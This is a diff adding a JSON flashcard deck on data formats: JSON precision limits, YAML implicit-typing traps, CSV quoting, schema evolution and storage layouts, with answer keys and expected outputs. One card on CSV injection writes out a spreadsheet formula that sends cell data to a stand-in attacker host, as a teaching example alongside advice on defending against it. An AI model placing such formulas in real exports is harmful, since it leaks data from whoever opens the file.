@@ -1,0 +1,160 @@
+{
+  "id": "data-formats",
+  "name": "Data Formats & Serialization",
+  "icon": "🧾",
+  "category": "Data & Databases",
+  "color": "#0369A1",
+  "description": "JSON, YAML, TOML and CSV and their traps, binary formats such as Protocol Buffers and Avro, row versus columnar storage, and evolving schemas safely.",
+  "modules": [
+    {
+      "id": "fmt-text-formats",
+      "name": "Text Formats & Their Traps",
+      "description": "JSON limits and big numbers, YAML gotchas, CSV quoting and formula injection, and choosing a config format.",
+      "cards": [
+        {
+          "id": "fmt-json-limits",
+          "type": "flip",
+          "difficulty": 2,
+          "tags": ["formats.json"],
+          "prompt": "What can JSON not represent, and what are the common consequences?",
+          "answer": "No comments, no trailing commas, no dates (only strings), no `NaN` or `Infinity`, no binary data (base64 it), no undefined, and no distinction between integer and float — many parsers, including JavaScript's, read every number as a 64-bit double.",
+          "explanation": "Agree on conventions: ISO 8601 strings with an offset for timestamps, large IDs as strings, base64 for bytes, and a JSON Schema (or OpenAPI) that validates payloads at the boundary. Duplicate keys are technically allowed and parsers disagree on which one wins — a source of security bugs.",
+          "prerequisites": ["js-json-pitfalls"],
+          "resources": [
+            { "title": "RFC 8259 — The JSON Data Interchange Format", "url": "https://www.rfc-editor.org/rfc/rfc8259", "kind": "spec" }
+          ]
+        },
+        {
+          "id": "fmt-json-big-ids",
+          "type": "predict-output",
+          "difficulty": 3,
+          "tags": ["formats.json", "num.float"],
+          "prompt": "In Node, what does this print?",
+          "code": "const json = '{\"id\": 9007199254740993, \"idStr\": \"9007199254740993\"}';\nconst obj = JSON.parse(json);\nconsole.log(String(obj.id));\nconsole.log(obj.idStr);",
+          "lang": "javascript",
+          "answer": "9007199254740992\n9007199254740993",
+          "explanation": "`JSON.parse` turns numbers into doubles, and 9007199254740993 is above 2^53, so it silently rounds to the nearest representable value — a different ID. Twitter/X and others send IDs as strings (`\"id_str\"`) for exactly this reason. Parse as a string, or use a reviver with `BigInt` for genuinely numeric values.",
+          "prerequisites": ["js-number-precision"],
+          "resources": [
+            { "title": "MDN — JSON.parse()", "url": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse", "kind": "docs" }
+          ],
+          "verify": { "runtime": "node", "expectedOutput": "9007199254740992\n9007199254740993" }
+        },
+        {
+          "id": "fmt-yaml-gotchas",
+          "type": "spot-bug",
+          "difficulty": 3,
+          "tags": ["formats.yaml", "config"],
+          "prompt": "This YAML loads with surprising values. What are they, and how do you avoid them?",
+          "code": "countries:\n  - GB\n  - NO\nversion: 1.10\npermissions: 010\nport_mapping: 22:22",
+          "lang": "yaml",
+          "answer": "Under YAML 1.1 rules (still used by many parsers): `NO` becomes boolean `false` (the \"Norway problem\"), `1.10` becomes the float `1.1`, `010` may become octal 8, and `22:22` can become the number 1342 (sexagesimal). Quote strings that are meant to be strings, and prefer YAML 1.2 parsers or schemas that validate types.",
+          "explanation": "YAML's implicit typing guesses from the text's shape. Also: indentation is significant, tabs are not allowed, and in Python `yaml.load` on untrusted input can construct arbitrary objects — always use `yaml.safe_load`.",
+          "prerequisites": ["as-deserialization"],
+          "resources": [
+            { "title": "The Norway Problem — why StrictYAML refuses implicit typing", "url": "https://hitchdev.com/strictyaml/why/implicit-typing-removed/", "kind": "article" }
+          ]
+        },
+        {
+          "id": "fmt-csv-quoting",
+          "type": "predict-output",
+          "difficulty": 2,
+          "tags": ["formats.csv"],
+          "prompt": "What does this print?",
+          "code": "import csv, io\nbuf = io.StringIO()\nw = csv.writer(buf, lineterminator='\\n')\nw.writerow(['id', 'name', 'notes'])\nw.writerow([1, 'Smith, Ada', 'said \"hi\"'])\nprint(buf.getvalue(), end='')\nbuf.seek(0)\nrows = list(csv.reader(buf))\nprint(rows[1])",
+          "lang": "python",
+          "answer": "id,name,notes\n1,\"Smith, Ada\",\"said \"\"hi\"\"\"\n['1', 'Smith, Ada', 'said \"hi\"']",
+          "explanation": "In CSV, fields containing commas, quotes or newlines must be wrapped in double quotes, and quotes inside a field are doubled. Splitting lines on commas by hand breaks on exactly these values — always use a real CSV library for reading and writing. Specify the encoding (UTF-8, sometimes with a BOM for Excel) and the delimiter explicitly.",
+          "resources": [
+            { "title": "RFC 4180 — Common format for CSV files", "url": "https://www.rfc-editor.org/rfc/rfc4180", "kind": "spec" }
+          ],
+          "verify": { "runtime": "python", "expectedOutput": "id,name,notes\n1,\"Smith, Ada\",\"said \"\"hi\"\"\"\n['1', 'Smith, Ada', 'said \"hi\"']" }
+        },
+        {
+          "id": "fmt-csv-injection",
+          "type": "flip",
+          "difficulty": 3,
+          "tags": ["formats.csv", "appsec.injection"],
+          "prompt": "What is CSV (formula) injection?",
+          "answer": "A user stores a value such as `=HYPERLINK(\"https://evil.example?d=\"&A1, \"Click\")` or `=cmd|...`. When an admin exports the data to CSV and opens it in a spreadsheet, the cell is evaluated as a formula — exfiltrating data or, in older setups, running commands.",
+          "explanation": "Neutralise cells that begin with `=`, `+`, `-`, `@`, tab or carriage return when exporting (commonly by prefixing a single quote), and warn users about spreadsheets from untrusted sources. It is output encoding for yet another interpreter — the spreadsheet.",
+          "prerequisites": ["as-injection-general"],
+          "resources": [
+            { "title": "OWASP — CSV Injection", "url": "https://owasp.org/www-community/attacks/CSV_Injection", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "fmt-config-formats",
+          "type": "compare",
+          "difficulty": 2,
+          "tags": ["formats.config"],
+          "prompt": "JSON vs YAML vs TOML for configuration files",
+          "answer": "JSON is strict and universal but has no comments; YAML is concise and supports comments and anchors but has implicit typing and indentation traps; TOML is explicit and typed with comments, designed for config (Cargo.toml, pyproject.toml), but awkward for deep nesting.",
+          "columns": {
+            "left": { "title": "JSON / TOML", "points": ["JSON: strict, no comments, universal", "JSON: best as a machine-written format", "TOML: explicit types, comments", "TOML: flat-ish config, awkward deep nesting"] },
+            "right": { "title": "YAML", "points": ["Readable, supports comments", "Anchors and references reduce repetition", "Implicit typing surprises", "Indentation errors are silent structure changes"] }
+          },
+          "explanation": "Whatever the format, validate configuration against a schema when loading it and fail fast. For large, generated or environment-specific configuration, a real language with types (CUE, Jsonnet, Pkl, or code) can beat piles of templated YAML.",
+          "prerequisites": ["fmt-yaml-gotchas"],
+          "resources": [
+            { "title": "TOML specification", "url": "https://toml.io/en/v1.0.0", "kind": "spec" }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "fmt-binary-schema",
+      "name": "Binary Formats & Schemas",
+      "description": "Binary serialization, row versus columnar storage, and forward and backward compatible schema evolution.",
+      "cards": [
+        {
+          "id": "fmt-binary-vs-text",
+          "type": "compare",
+          "difficulty": 3,
+          "tags": ["formats.binary", "api.grpc"],
+          "prompt": "Text formats (JSON) vs binary schema formats (Protocol Buffers, Avro)",
+          "answer": "JSON is self-describing, human-readable and needs no schema, at the cost of size and parsing speed. Protobuf and Avro encode data compactly against a schema — field numbers or positions instead of repeated key names — giving smaller messages, faster parsing and generated typed code.",
+          "columns": {
+            "left": { "title": "JSON", "points": ["Human-readable, self-describing", "No schema required (but you should have one)", "Larger and slower to parse", "Universal: browsers, logs, curl"] },
+            "right": { "title": "Protobuf / Avro", "points": ["Compact binary, schema required", "Fast; generated typed classes", "Unreadable without tooling", "Explicit rules for schema evolution"] }
+          },
+          "explanation": "Binary formats suit high-volume internal traffic, storage and streaming; JSON suits public APIs, debugging and browsers. MessagePack and CBOR are schema-less binary JSON equivalents, smaller than JSON but without generated types.",
+          "prerequisites": ["fmt-json-limits", "api-protobuf-evolution"],
+          "resources": [
+            { "title": "Protocol Buffers — Overview", "url": "https://protobuf.dev/overview/", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "fmt-row-vs-columnar",
+          "type": "compare",
+          "difficulty": 3,
+          "tags": ["formats.columnar", "data.analytics"],
+          "prompt": "Row-oriented storage (CSV, JSON lines, OLTP databases) vs columnar storage (Parquet, ORC, analytical databases)",
+          "answer": "Row formats store each record's fields together — ideal for reading or writing whole records. Columnar formats store each column's values together — ideal for analytics that read a few columns across millions of rows, with excellent compression because similar values sit next to each other.",
+          "columns": {
+            "left": { "title": "Row-oriented", "points": ["Whole records stored contiguously", "Fast inserts and point lookups", "OLTP: orders, users, sessions", "Reads every column even if you need one"] },
+            "right": { "title": "Columnar", "points": ["Each column stored contiguously", "Reads only the columns queried", "High compression, vectorised scans", "OLAP: analytics, reporting, data lakes"] }
+          },
+          "explanation": "A query like `SELECT avg(price) FROM sales` reads one column from a columnar file instead of every byte of every row. That is why data lakes use Parquet and warehouses (BigQuery, Snowflake, DuckDB, ClickHouse) are columnar, while transactional databases stay row-oriented.",
+          "prerequisites": ["sd-batch-stream"],
+          "resources": [
+            { "title": "Apache Parquet — Overview", "url": "https://parquet.apache.org/docs/overview/", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "fmt-schema-evolution",
+          "type": "flip",
+          "difficulty": 4,
+          "tags": ["formats.schemas", "distributed.compatibility"],
+          "prompt": "What are backward and forward compatibility for data schemas, and which changes preserve them?",
+          "answer": "Backward compatible: new code can read data written with the old schema. Forward compatible: old code can read data written with the new schema. Adding optional fields with defaults and ignoring unknown fields preserves both; removing required fields, renaming fields, or changing types breaks one or both.",
+          "explanation": "Stored data and messages outlive the code that wrote them, and during rolling deploys old and new versions run side by side. Schema registries (for Kafka and Avro or Protobuf) enforce compatibility rules on every change, and \"tolerant reader\" consumers ignore what they do not understand.",
+          "prerequisites": ["fmt-binary-vs-text", "ms-versioning"],
+          "resources": [
+            { "title": "Designing Data-Intensive Applications — Chapter 4: Encoding and Evolution", "url": "https://dataintensive.net/", "kind": "book" }
+          ]
+        }
+      ]
+    }
+  ]
+}
